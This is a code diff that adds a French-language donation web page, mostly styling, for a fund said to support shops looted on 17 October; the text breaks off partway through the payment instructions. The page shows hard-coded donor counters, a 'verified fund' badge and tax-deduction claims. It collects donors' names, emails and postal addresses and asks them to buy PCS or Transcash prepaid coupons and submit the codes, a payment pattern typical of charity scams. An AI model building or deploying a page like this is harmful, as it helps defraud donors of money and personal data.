@@ -1,0 +1,1166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Faire un don — Soutien aux commerces pillés le 17 octobre</title>
+<style>
+  :root{
+    --bg:#070a16;--bg-2:#0c1024;
+    --surface:rgba(255,255,255,.04);--surface-2:rgba(255,255,255,.07);
+    --bord:rgba(255,255,255,.08);--bord-fort:rgba(255,255,255,.18);
+    --texte:#f4f6fc;--texte-2:#b3bacb;--texte-3:#6e7691;
+    --bleu:#002395;--bleu-clair:#1a4fd6;--bleu-neon:#3b6dff;
+    --rouge:#ED2939;--rouge-clair:#ff4d5c;
+    --vert:#22c55e;--jaune:#fbbf24;
+    --gradient-tricolore:linear-gradient(90deg,#002395 0%,#002395 33.33%,#ffffff 33.33%,#ffffff 66.66%,#ED2939 66.66%,#ED2939 100%);
+    --gradient-bleu:linear-gradient(135deg,#002395 0%,#1a4fd6 100%);
+    --gradient-rouge:linear-gradient(135deg,#ED2939 0%,#ff4d5c 100%);
+    --gradient-vert:linear-gradient(135deg,#22c55e 0%,#14b8a6 100%);
+    --gradient-titre:linear-gradient(180deg,#ffffff 0%,#c8d0e8 100%);
+    --ease:cubic-bezier(.4,0,.2,1);--ease-out:cubic-bezier(.16,1,.3,1);
+    --ease-spring:cubic-bezier(.34,1.56,.64,1);
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
+    background:var(--bg);color:var(--texte);line-height:1.6;min-height:100vh;
+    overflow-x:hidden;-webkit-font-smoothing:antialiased;letter-spacing:-.011em}
+  body::before{content:"";position:fixed;inset:0;z-index:-2;
+    background:radial-gradient(900px 700px at 8% 0%,rgba(0,35,149,.35),transparent 60%),
+      radial-gradient(700px 600px at 50% 10%,rgba(255,255,255,.05),transparent 60%),
+      radial-gradient(900px 700px at 95% 15%,rgba(237,41,57,.22),transparent 60%),
+      var(--bg);pointer-events:none;animation:fondGlow 14s ease-in-out infinite alternate}
+  @keyframes fondGlow{0%{opacity:1}100%{opacity:.85}}
+  @keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+  @keyframes scaleIn{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:scale(1)}}
+  @keyframes slideRight{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
+  @keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes pulseGlowBleu{0%,100%{box-shadow:0 0 0 0 rgba(0,35,149,.6)}50%{box-shadow:0 0 0 12px rgba(0,35,149,0)}}
+  @keyframes pop{0%{transform:scale(0);opacity:0}60%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
+  @keyframes onde{0%{transform:scale(.8);opacity:.6}100%{transform:scale(2.4);opacity:0}}
+  @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+  @keyframes confetti{0%{transform:translateY(-10vh) rotate(0);opacity:1}100%{transform:translateY(110vh) rotate(900deg);opacity:0}}
+  @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+  .header{position:relative;padding:4rem 1.5rem 6rem;text-align:center;overflow:hidden}
+  .bande-tricolore{position:absolute;top:0;left:0;right:0;height:4px;
+    background:var(--gradient-tricolore);animation:shimmer 4s linear infinite;
+    background-size:200% 100%;z-index:10}
+  .orb{position:absolute;border-radius:50%;filter:blur(90px);pointer-events:none;opacity:.55}
+  .orb-1{width:420px;height:420px;background:#002395;top:-150px;left:-120px;animation:float 10s ease-in-out infinite}
+  .orb-2{width:380px;height:380px;background:#ED2939;top:-100px;right:-100px;animation:float 12s ease-in-out infinite reverse}
+  .orb-3{width:320px;height:320px;background:#1a4fd6;bottom:-150px;left:40%;animation:float 14s ease-in-out infinite}
+  .header-contenu{position:relative;z-index:1;max-width:820px;margin:0 auto}
+  .badge{display:inline-flex;align-items:center;gap:.5rem;
+    background:rgba(0,35,149,.18);border:1px solid rgba(59,109,255,.4);
+    padding:.45rem 1rem;border-radius:999px;font-size:.8rem;font-weight:600;
+    letter-spacing:.02em;margin-bottom:1.5rem;color:#b8c8ff;
+    animation:fadeUp .7s var(--ease-out) both;backdrop-filter:blur(8px)}
+  .badge .dot{width:6px;height:6px;border-radius:50%;background:#fff;
+    box-shadow:0 0 10px #fff;animation:blink 2s ease-in-out infinite}
+  .header h1{font-size:clamp(2rem,5vw,3.4rem);line-height:1.05;font-weight:800;
+    letter-spacing:-.03em;margin-bottom:1.2rem;animation:fadeUp .7s .1s var(--ease-out) both}
+  .header h1 .gradient-bleu{background:linear-gradient(135deg,#6b8cff 0%,#b8c8ff 100%);
+    -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
+  .header h1 .gradient-rouge{background:linear-gradient(135deg,#ff6b78 0%,#ffb8be 100%);
+    -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
+  .header p{color:var(--texte-2);font-size:1.1rem;max-width:620px;margin:0 auto;
+    animation:fadeUp .7s .2s var(--ease-out) both}
+  .stats{display:flex;justify-content:center;gap:1rem;margin-top:2.5rem;flex-wrap:wrap;
+    animation:fadeUp .7s .3s var(--ease-out) both}
+  .stat{background:var(--surface);border:1px solid var(--bord);border-radius:16px;
+    padding:1rem 1.5rem;min-width:150px;backdrop-filter:blur(12px);
+    transition:.3s var(--ease);position:relative;overflow:hidden}
+  .stat::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;
+    background:var(--gradient-tricolore);opacity:0;transition:.3s var(--ease)}
+  .stat:hover{border-color:var(--bord-fort);transform:translateY(-3px);background:var(--surface-2)}
+  .stat:hover::before{opacity:1}
+  .stat strong{display:block;font-size:1.6rem;font-weight:800;letter-spacing:-.02em;
+    background:linear-gradient(135deg,#fff,#a8b8e8);-webkit-background-clip:text;
+    background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
+  .stat span{font-size:.75rem;color:var(--texte-3);text-transform:uppercase;
+    letter-spacing:.08em;font-weight:600}
+
+  .main{max-width:1140px;margin:-3rem auto 0;padding:0 1.5rem 6rem;position:relative;z-index:2}
+  .layout{display:grid;grid-template-columns:1fr 380px;gap:1.5rem;align-items:start}
+  @media(max-width:960px){.layout{grid-template-columns:1fr}}
+  .panneau{background:rgba(12,16,36,.78);backdrop-filter:blur(24px);
+    border:1px solid var(--bord);border-radius:24px;overflow:hidden;position:relative;
+    box-shadow:0 20px 60px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.05);
+    animation:fadeUp .8s .35s var(--ease-out) both}
+  .panneau::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;
+    background:var(--gradient-tricolore)}
+  .etapes{display:flex;padding:.75rem;gap:.25rem;background:rgba(0,0,0,.25);
+    border-bottom:1px solid var(--bord)}
+  .etape{flex:1;display:flex;align-items:center;justify-content:center;gap:.5rem;
+    padding:.85rem .5rem;border-radius:12px;font-size:.83rem;font-weight:600;
+    color:var(--texte-3);transition:.4s var(--ease);position:relative;cursor:default}
+  .etape .num{width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,.06);
+    color:var(--texte-3);display:flex;align-items:center;justify-content:center;
+    font-size:.75rem;font-weight:700;transition:.4s var(--ease);border:1px solid transparent}
+  .etape.active{background:rgba(0,35,149,.25);color:var(--texte);
+    box-shadow:inset 0 0 0 1px rgba(59,109,255,.4)}
+  .etape.active .num{background:var(--gradient-bleu);color:#fff;
+    box-shadow:0 0 20px rgba(59,109,255,.6);animation:pulseGlowBleu 2s ease-in-out infinite}
+  .etape.done{color:var(--vert)}
+  .etape.done .num{background:var(--gradient-vert);color:#fff;border-color:transparent}
+  @media(max-width:600px){.etape{font-size:0;gap:0;padding:.7rem}.etape .num{font-size:.75rem}}
+  .contenu{padding:2.5rem}
+  @media(max-width:600px){.contenu{padding:1.75rem 1.25rem}}
+  .pane{display:none}
+  .pane.visible{display:block;animation:slideRight .5s var(--ease-out) both}
+  .pane h2{font-size:1.65rem;font-weight:800;letter-spacing:-.02em;margin-bottom:.5rem;
+    background:var(--gradient-titre);-webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;color:transparent}
+  .sous-titre{color:var(--texte-2);font-size:.95rem;margin-bottom:2rem}
+
+  .montants{display:grid;grid-template-columns:repeat(4,1fr);gap:.75rem;margin-bottom:1.5rem}
+  @media(max-width:560px){.montants{grid-template-columns:repeat(2,1fr)}}
+  .montant-btn{position:relative;padding:1.1rem .5rem;background:var(--surface);
+    border:1px solid var(--bord);border-radius:14px;cursor:pointer;color:var(--texte);
+    font-family:inherit;font-weight:700;font-size:1.1rem;letter-spacing:-.02em;
+    transition:.3s var(--ease-out);overflow:hidden}
+  .montant-btn small{display:block;font-size:.7rem;font-weight:500;color:var(--texte-3);
+    margin-top:.2rem;transition:.3s}
+  .montant-btn:hover{border-color:var(--bord-fort);background:var(--surface-2);transform:translateY(-3px)}
+  .montant-btn:active{transform:translateY(-1px) scale(.98)}
+  .montant-btn.actif{background:linear-gradient(135deg,rgba(0,35,149,.55),rgba(26,79,214,.35));
+    border-color:rgba(59,109,255,.7);color:#fff;
+    box-shadow:0 8px 24px rgba(0,35,149,.4),inset 0 1px 0 rgba(255,255,255,.15)}
+  .montant-btn.actif small{color:rgba(255,255,255,.75)}
+  .montant-btn.actif::before{content:"";position:absolute;inset:0;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
+    background-size:200% 100%;animation:shimmer 2.5s infinite}
+
+  .champ{position:relative;margin-bottom:1.25rem}
+  .champ label{display:block;font-weight:600;font-size:.82rem;color:var(--texte-2);
+    margin-bottom:.5rem;letter-spacing:.01em}
+  .champ input,.champ select,.champ textarea{width:100%;padding:.9rem 1.1rem;
+    background:rgba(0,0,0,.35);border:1px solid var(--bord);border-radius:12px;
+    color:var(--texte);font-size:1rem;font-family:inherit;transition:.3s var(--ease-out)}
+  .champ input::placeholder,.champ textarea::placeholder{color:var(--texte-3)}
+  .champ input:focus,.champ select:focus,.champ textarea:focus{outline:none;
+    border-color:rgba(59,109,255,.7);background:rgba(0,35,149,.08);
+    box-shadow:0 0 0 4px rgba(59,109,255,.15)}
+  .champ select{cursor:pointer;appearance:none;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8' fill='none'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%23b3bacb' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+    background-repeat:no-repeat;background-position:right 1.1rem center;padding-right:2.5rem}
+  .champ select option{background:#0c1024;color:var(--texte)}
+  .champ .unite{position:absolute;right:1.1rem;bottom:.95rem;font-weight:700;
+    color:var(--texte-3);pointer-events:none;transition:.3s}
+  .champ input:focus ~ .unite{color:var(--bleu-neon)}
+  .champ .erreur{color:var(--rouge-clair);font-size:.78rem;margin-top:.4rem;
+    display:none;font-weight:500;animation:slideRight .3s var(--ease-out)}
+  .champ.invalide input,.champ.invalide select{border-color:var(--rouge);
+    background:rgba(237,41,57,.06);animation:shake .4s var(--ease)}
+  .champ.invalide .erreur{display:block}
+  .deux-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+  @media(max-width:560px){.deux-col{grid-template-columns:1fr}}
+
+  .coupons-choix{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1.5rem}
+  @media(max-width:560px){.coupons-choix{grid-template-columns:1fr}}
+  .coupon-btn{display:flex;align-items:center;gap:1rem;padding:1.1rem 1.25rem;
+    background:var(--surface);border:2px solid var(--bord);border-radius:16px;
+    cursor:pointer;color:var(--texte);font-family:inherit;text-align:left;
+    transition:.3s var(--ease-out);position:relative;overflow:hidden}
+  .coupon-btn:hover{border-color:var(--bord-fort);background:var(--surface-2);transform:translateY(-2px)}
+  .coupon-btn.actif{border-color:rgba(59,109,255,.75);
+    background:linear-gradient(135deg,rgba(0,35,149,.45),rgba(26,79,214,.25));
+    box-shadow:0 8px 24px rgba(0,35,149,.4)}
+  .coupon-btn .logo{width:56px;height:56px;border-radius:10px;flex-shrink:0;
+    display:flex;align-items:center;justify-content:center;
+    background:#fff;padding:4px;overflow:hidden;
+    border:1px solid rgba(255,255,255,.15)}
+  .coupon-btn .logo img{max-width:100%;max-height:100%;width:auto;height:auto;
+    object-fit:contain;display:block}
+  .coupon-btn .info strong{display:block;font-size:.95rem;font-weight:700;margin-bottom:.15rem}
+  .coupon-btn .info small{font-size:.75rem;color:var(--texte-2)}
+
+  /* ---- LISTE TABACS ---- */
+  .liste-tabacs{margin-bottom:1.5rem;border-radius:16px;border:1px solid var(--bord);
+    background:rgba(0,0,0,.3);overflow:hidden;animation:slideRight .5s var(--ease-out)}
+  .liste-tabacs .entete-liste{padding:.9rem 1.15rem;background:rgba(0,35,149,.15);
+    border-bottom:1px solid var(--bord);display:flex;align-items:center;
+    justify-content:space-between;gap:.75rem;flex-wrap:wrap}
+  .liste-tabacs .entete-liste strong{font-size:.9rem;font-weight:700}
+  .liste-tabacs .entete-liste small{font-size:.75rem;color:var(--texte-2)}
+  .liste-tabacs ul{list-style:none;max-height:380px;overflow-y:auto}
+  .liste-tabacs li{padding:.85rem 1.15rem;border-bottom:1px solid rgba(255,255,255,.04);
+    display:flex;gap:.9rem;align-items:center;transition:.2s var(--ease-out)}
+  .liste-tabacs li:last-child{border-bottom:none}
+  .liste-tabacs li:hover{background:rgba(59,109,255,.06)}
+  .liste-tabacs .pastille{width:44px;height:34px;border-radius:8px;flex-shrink:0;
+    background:#fff;display:flex;align-items:center;justify-content:center;
+    padding:2px;overflow:hidden;border:1px solid rgba(255,255,255,.15)}
+  .liste-tabacs .pastille img{max-width:100%;max-height:100%;width:auto;height:auto;
+    object-fit:contain;display:block}
+  .liste-tabacs .infos{flex:1;min-width:0}
+  .liste-tabacs .nom{font-weight:700;font-size:.92rem;color:var(--texte);
+    margin-bottom:.15rem;word-break:break-word}
+  .liste-tabacs .adr{font-size:.78rem;color:var(--texte-2);line-height:1.4;word-break:break-word}
+  .liste-tabacs .dist{font-size:.72rem;color:var(--bleu-neon);font-weight:700;
+    white-space:nowrap;text-align:right}
+  .liste-tabacs .dist strong{display:block;font-size:.85rem;color:#93c5fd}
+  .liste-tabacs .vide{padding:1.5rem 1.15rem;text-align:center;color:var(--texte-2);font-size:.85rem}
+  .liste-tabacs .chargement{padding:1.5rem 1.15rem;text-align:center;color:var(--texte-2);font-size:.85rem}
+  .liste-tabacs .chargement::before{content:"";display:inline-block;width:14px;height:14px;
+    border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;
+    animation:spin .7s linear infinite;vertical-align:middle;margin-right:.5rem}
+
+  .notice{background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.2);
+    border-left:3px solid var(--jaune);padding:1rem 1.15rem;border-radius:10px;
+    font-size:.85rem;margin:1rem 0;color:#fde68a;line-height:1.6}
+  .notice strong{color:#fcd34d;font-weight:700}
+  .notice code{background:rgba(0,0,0,.4);padding:.15rem .5rem;border-radius:5px;
+    color:#fff;font-weight:700}
+
+  .actions{display:flex;gap:.75rem;margin-top:2rem;flex-wrap:wrap}
+  .btn{flex:1;min-width:140px;padding:1rem 1.5rem;border:none;border-radius:12px;
+    font-size:.95rem;font-weight:700;font-family:inherit;cursor:pointer;
+    transition:.3s var(--ease-out);position:relative;overflow:hidden;
+    letter-spacing:-.01em;display:inline-flex;align-items:center;
+    justify-content:center;gap:.5rem}
+  .btn::after{content:"";position:absolute;inset:0;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.25),transparent);
+    background-size:200% 100%;opacity:0;transition:opacity .3s}
+  .btn:hover::after{opacity:1;animation:shimmer 1.5s infinite}
+  .btn-primaire{background:var(--gradient-rouge);color:#fff;
+    box-shadow:0 8px 24px rgba(237,41,57,.4)}
+  .btn-primaire:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(237,41,57,.55)}
+  .btn-primaire:active{transform:translateY(0) scale(.98)}
+  .btn-bleu{background:var(--gradient-bleu);color:#fff;
+    box-shadow:0 8px 24px rgba(0,35,149,.45)}
+  .btn-bleu:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,35,149,.6)}
+  .btn-secondaire{background:rgba(255,255,255,.05);color:var(--texte);
+    border:1px solid var(--bord)}
+  .btn-secondaire:hover{background:rgba(255,255,255,.1);
+    border-color:var(--bord-fort);transform:translateY(-1px)}
+  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}
+  .btn.loading{color:transparent;pointer-events:none}
+  .btn.loading::before{content:"";position:absolute;width:20px;height:20px;
+    top:50%;left:50%;margin:-10px 0 0 -10px;
+    border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;
+    border-radius:50%;animation:spin .7s linear infinite}
+
+  .recap{background:rgba(12,16,36,.78);backdrop-filter:blur(24px);
+    border:1px solid var(--bord);border-radius:24px;padding:1.75rem;
+    position:sticky;top:1.5rem;
+    box-shadow:0 20px 60px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.05);
+    animation:fadeUp .8s .45s var(--ease-out) both;overflow:hidden}
+  .recap::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;
+    background:var(--gradient-tricolore)}
+  .recap h3{font-size:.75rem;font-weight:700;text-transform:uppercase;
+    letter-spacing:.1em;color:var(--texte-3);margin-bottom:1.25rem;
+    display:flex;align-items:center;gap:.5rem}
+  .recap h3::before{content:"";width:6px;height:6px;border-radius:50%;
+    background:var(--gradient-tricolore);box-shadow:0 0 8px rgba(59,109,255,.8)}
+  .recap-ligne{display:flex;justify-content:space-between;align-items:center;
+    padding:.7rem 0;font-size:.9rem;color:var(--texte-2);
+    border-bottom:1px solid rgba(255,255,255,.04);transition:.3s var(--ease-out)}
+  .recap-ligne:last-of-type{border-bottom:none}
+  .recap-ligne span:last-child{font-weight:700;color:var(--texte);font-size:.95rem}
+  .recap-ligne.total{border-top:1px solid var(--bord);margin-top:.5rem;
+    padding-top:1.25rem;font-size:.9rem;color:var(--texte-2);border-bottom:none}
+  .recap-ligne.total span:last-child{font-size:1.85rem;font-weight:800;
+    letter-spacing:-.03em;background:linear-gradient(135deg,#fff,#a8b8e8);
+    -webkit-background-clip:text;background-clip:text;
+    -webkit-text-fill-color:transparent;color:transparent}
+  .recap .fiscal{margin-top:1.25rem;padding:1.1rem 1.25rem;
+    background:linear-gradient(135deg,rgba(34,197,94,.1),rgba(20,184,166,.06));
+    border:1px solid rgba(34,197,94,.2);border-radius:14px;
+    font-size:.8rem;color:#86efac;line-height:1.6}
+  .recap .fiscal strong{display:block;font-size:1.25rem;font-weight:800;
+    color:#4ade80;margin:.35rem 0 .15rem;letter-spacing:-.02em}
+  .recap .fiscal span{color:var(--texte-2);font-size:.75rem}
+  .recap .fiscal span span{color:#4ade80;font-weight:700}
+  .secu{display:flex;align-items:center;gap:.5rem;margin-top:1.25rem;
+    font-size:.75rem;color:var(--texte-3);font-weight:500;padding-top:1.25rem;
+    border-top:1px solid rgba(255,255,255,.04)}
+  .flash{animation:pulseGlowBleu .5s var(--ease-out)}
+  .confirmation{text-align:center;padding:1rem 0}
+  .check{width:90px;height:90px;border-radius:50%;
+    background:linear-gradient(135deg,rgba(0,35,149,.4),rgba(26,79,214,.2));
+    border:1px solid rgba(59,109,255,.5);display:flex;align-items:center;
+    justify-content:center;font-size:2.5rem;color:#fff;margin:0 auto 1.75rem;
+    position:relative;animation:pop .7s var(--ease-spring);
+    box-shadow:0 0 40px rgba(59,109,255,.5)}
+  .check::before,.check::after{content:"";position:absolute;inset:0;border-radius:50%;
+    border:1px solid rgba(59,109,255,.5);animation:onde 1.2s var(--ease-out)}
+  .check::after{animation-delay:.3s}
+  .confirmation h2{font-size:1.9rem;font-weight:800;letter-spacing:-.02em;
+    margin-bottom:.5rem;animation:fadeUp .5s .2s var(--ease-out) both;
+    background:var(--gradient-titre);-webkit-background-clip:text;
+    background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
+  .confirmation .sous-titre{animation:fadeUp .5s .3s var(--ease-out) both;
+    margin-bottom:1.5rem}
+  .confirmation .detail{background:rgba(0,0,0,.35);border:1px solid var(--bord);
+    border-radius:16px;padding:1.35rem;max-width:440px;margin:0 auto 1.5rem;
+    text-align:left;font-size:.88rem;animation:fadeUp .5s .4s var(--ease-out) both;
+    position:relative;overflow:hidden}
+  .confirmation .detail::before{content:"";position:absolute;top:0;left:0;right:0;
+    height:2px;background:var(--gradient-tricolore)}
+  .confirmation .detail div{display:flex;justify-content:space-between;
+    gap:1rem;padding:.5rem 0;border-bottom:1px solid rgba(255,255,255,.04)}
+  .confirmation .detail div:last-child{border-bottom:none}
+  .confirmation .detail div span:first-child{color:var(--texte-2)}
+  .confirmation .detail div span:last-child{font-weight:700;color:var(--texte)}
+  .confetti{position:fixed;width:10px;height:10px;top:0;z-index:50;
+    pointer-events:none;animation:confetti 3s var(--ease-out) forwards}
+  .footer{text-align:center;padding:3rem 1.5rem;font-size:.82rem;
+    color:var(--texte-3);border-top:1px solid rgba(255,255,255,.04);
+    margin-top:2rem;position:relative}
+  .footer::before{content:"";position:absolute;top:0;left:50%;transform:translateX(-50%);
+    width:80px;height:2px;background:var(--gradient-tricolore);border-radius:2px}
+  .footer a{color:var(--texte-2);text-decoration:none;font-weight:500;
+    transition:.2s var(--ease-out);position:relative}
+  .footer a:hover{color:var(--texte)}
+  .toast{position:fixed;bottom:1.5rem;left:50%;
+    transform:translateX(-50%) translateY(150%);
+    background:rgba(12,16,36,.96);backdrop-filter:blur(20px);
+    border:1px solid var(--bord);color:var(--texte);padding:.9rem 1.4rem;
+    border-radius:12px;font-size:.88rem;font-weight:600;
+    box-shadow:0 20px 60px rgba(0,0,0,.6);transition:.4s var(--ease-spring);
+    z-index:100;display:flex;align-items:center;gap:.6rem;max-width:90vw}
+  .toast.visible{transform:translateX(-50%) translateY(0)}
+  .toast.erreur{background:rgba(237,41,57,.18);border-color:rgba(237,41,57,.4);color:#fda4af}
+  .toast.succes{background:rgba(34,197,94,.15);border-color:rgba(34,197,94,.3);color:#86efac}
+  .check-label{display:flex;gap:.7rem;align-items:flex-start;font-size:.85rem;
+    margin-bottom:1.5rem;cursor:pointer;color:var(--texte-2);padding:.9rem 1rem;
+    background:rgba(0,0,0,.25);border-radius:10px;border:1px solid var(--bord);
+    transition:.3s var(--ease-out)}
+  .check-label:hover{border-color:var(--bord-fort);background:rgba(0,0,0,.35)}
+  .check-label input{appearance:none;width:20px;height:20px;border-radius:6px;
+    border:2px solid var(--texte-3);cursor:pointer;flex-shrink:0;margin-top:.05rem;
+    position:relative;transition:.3s var(--ease-spring);background:rgba(0,0,0,.3)}
+  .check-label input:checked{background:var(--gradient-bleu);border-color:transparent;
+    box-shadow:0 0 12px rgba(59,109,255,.5)}
+  .check-label input:checked::after{content:"✓";position:absolute;inset:0;
+    display:flex;align-items:center;justify-content:center;color:#fff;
+    font-weight:700;font-size:.8rem;animation:pop .4s var(--ease-spring)}
+  .check-label strong{color:var(--texte);font-weight:700}
+  @media (prefers-reduced-motion: reduce){
+    *,*::before,*::after{animation-duration:.01ms!important;
+      animation-iteration-count:1!important;transition-duration:.01ms!important}
+  }
+</style>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="bande-tricolore"></div>
+
+<header class="header">
+  <div class="orb orb-1"></div>
+  <div class="orb orb-2"></div>
+  <div class="orb orb-3"></div>
+  <div class="header-contenu">
+    <div class="badge"><span class="dot"></span>Fonds de soutien vérifié</div>
+    <h1>Soutenons les commerces<br><span class="gradient-bleu">pillés</span> <span class="gradient-rouge">le 17 octobre</span></h1>
+    <p>Chaque don aide un artisan, un commerçant ou un indépendant à rouvrir sa boutique. 100&nbsp;% des fonds sont redistribués sur justificatifs.</p>
+    <div class="stats">
+      <div class="stat"><strong data-compteur="1842">0</strong><span>dons reçus</span></div>
+      <div class="stat"><strong data-compteur="87450" data-suffixe=" €">0</strong><span>collectés</span></div>
+      <div class="stat"><strong data-compteur="214">0</strong><span>commerces aidés</span></div>
+    </div>
+  </div>
+</header>
+
+<main class="main">
+<div class="layout">
+  <div class="panneau">
+    <div class="etapes" id="etapes">
+      <div class="etape active" data-etape="1"><span class="num">1</span>Montant</div>
+      <div class="etape" data-etape="2"><span class="num">2</span>Coordonnées</div>
+      <div class="etape" data-etape="3"><span class="num">3</span>Coupon</div>
+      <div class="etape" data-etape="4"><span class="num">4</span>Confirmation</div>
+    </div>
+
+    <div class="contenu">
+
+      <!-- ÉTAPE 1 -->
+      <div class="pane visible" id="pane1">
+        <h2>Choisissez votre montant</h2>
+        <p class="sous-titre">Un don ponctuel, déductible à 66&nbsp;% de votre impôt sur le revenu.</p>
+        <div class="montants" id="montants">
+          <button type="button" class="montant-btn" data-montant="10">10 €<small>soit 3,40 € après impôt</small></button>
+          <button type="button" class="montant-btn actif" data-montant="25">25 €<small>soit 8,50 € après impôt</small></button>
+          <button type="button" class="montant-btn" data-montant="50">50 €<small>soit 17 € après impôt</small></button>
+          <button type="button" class="montant-btn" data-montant="100">100 €<small>soit 34 € après impôt</small></button>
+        </div>
+        <div class="champ" id="champMontant">
+          <label for="montantLibre">Ou saisissez un montant libre</label>
+          <input type="number" id="montantLibre" min="1" step="1" placeholder="Montant en euros" value="25">
+          <span class="unite">€</span>
+          <div class="erreur">Veuillez saisir un montant valide (minimum 1 €).</div>
+        </div>
+        <div class="champ">
+          <label for="typeDon">Type de don</label>
+          <select id="typeDon">
+            <option value="ponctuel">Don ponctuel</option>
+            <option value="mensuel">Don mensuel (engagement 12 mois)</option>
+          </select>
+        </div>
+        <div class="actions">
+          <button class="btn btn-bleu" id="btnEtape1">Continuer →</button>
+        </div>
+      </div>
+
+      <!-- ÉTAPE 2 -->
+      <div class="pane" id="pane2">
+        <h2>Vos coordonnées</h2>
+        <p class="sous-titre">Nécessaires pour établir votre reçu fiscal. Aucune donnée n'est revendue.</p>
+        <div class="deux-col">
+          <div class="champ" id="champPrenom">
+            <label for="prenom">Prénom *</label>
+            <input type="text" id="prenom" placeholder="Marie" autocomplete="given-name">
+            <div class="erreur">Prénom requis.</div>
+          </div>
+          <div class="champ" id="champNom">
+            <label for="nom">Nom *</label>
+            <input type="text" id="nom" placeholder="Dupont" autocomplete="family-name">
+            <div class="erreur">Nom requis.</div>
+          </div>
+        </div>
+        <div class="champ" id="champEmail">
+          <label for="email">Adresse e-mail *</label>
+          <input type="email" id="email" placeholder="marie.dupont@exemple.fr" autocomplete="email">
+          <div class="erreur">Adresse e-mail invalide.</div>
+        </div>
+        <div class="champ" id="champAdresse">
+          <label for="adresse">Adresse postale * <small style="color:var(--texte-3);font-weight:500">(reçu + recherche tabacs)</small></label>
+          <input type="text" id="adresse" placeholder="12 rue de la Paix, 75002 Paris" autocomplete="street-address">
+          <div class="erreur">Adresse requise (min. 5 caractères).</div>
+        </div>
+        <div class="champ">
+          <label for="message">Message de soutien (facultatif)</label>
+          <textarea id="message" rows="2" placeholder="Un mot pour les commerçants…"></textarea>
+        </div>
+        <label class="check-label">
+          <input type="checkbox" id="anonyme">
+          <span>Je souhaite rester <strong>anonyme</strong> dans la liste publique des donateurs.</span>
+        </label>
+        <div class="actions">
+          <button class="btn btn-secondaire" id="btnRetour1">← Retour</button>
+          <button class="btn btn-bleu" id="btnEtape2">Continuer →</button>
+        </div>
+      </div>
+
+      <!-- ÉTAPE 3 -->
+      <div class="pane" id="pane3">
+        <h2>Paiement par coupon</h2>
+        <p class="sous-titre">Achetez un coupon PCS ou Transcash dans un bureau de tabac proche, puis transmettez-nous le code.</p>
+
+        <div class="coupons-choix" id="couponsChoix">
+          <button type="button" class="coupon-btn pcs" data-coupon="pcs">
+            <div class="logo">
+              <img src="https://www.welovecustomers.fr/wp-content/uploads/2021/07/Logo-PCS-450x200-1.png"
+                   alt="Logo PCS" loading="lazy">
+            </div>
+            <div class="info">
+              <strong>Coupon PCS</strong>
+              <small>Disponible en bureau de tabac</small>
+            </div>
+          </button>
+          <button type="button" class="coupon-btn transcash" data-coupon="transcash">
+            <div class="logo">
+              <img src="https://recharge-prd.asset.akeneo.cloud/product_assets/media/Transcash.png"
+                   alt="Logo Transcash" loading="lazy">
+            </div>
+            <div class="info">
+              <strong>Coupon Transcash</strong>
+              <small>Disponible en bureau de tabac</small>
+            </div>
+          </button>
+        </div>
+
+        <!-- Liste réelle des tabacs -->
+        <div class="liste-tabacs" id="listeTabacs">
+          <div class="entete-liste">
+            <div>
+              <strong>Bureaux de tabac trouvés</strong>
+              <br>
+              <small id="listeSousTitre">Recherche en cours…</small>
+            </div>
+            <small id="listeFournisseur" style="color:var(--texte-3)">Données OSM</small>
+          </div>
+          <ul id="listeTabacsUl">
+            <li class="chargement">Recherche des bureaux de tabac autour de votre adresse…</li>
+          </ul>
+        </div>
+
+        <div class="notice">
+          <strong>Comment ça marche ?</strong><br>
+          1. Achetez un coupon <strong>PCS</strong> ou <strong>Transcash</strong> du montant de votre don dans un bureau de tabac.<br>
+          2. Saisissez le <strong>code du coupon</strong> ci-dessous.<br>
